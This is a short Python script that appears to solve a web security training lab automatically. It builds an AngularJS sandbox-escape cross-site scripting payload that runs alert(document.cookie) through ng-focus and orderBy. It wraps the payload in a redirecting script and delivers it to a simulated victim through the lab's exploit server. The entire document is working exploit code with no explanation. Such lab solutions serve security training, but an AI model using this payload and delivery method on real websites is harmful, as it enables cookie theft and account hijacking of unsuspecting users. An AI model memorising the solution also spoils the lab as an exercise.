from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>"
    script = f"""<script>document.location = "{session.url}?search={xss}#x"</script>"""

    server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    server.deliver_exploit_to_victim("/exploit", headers, script)
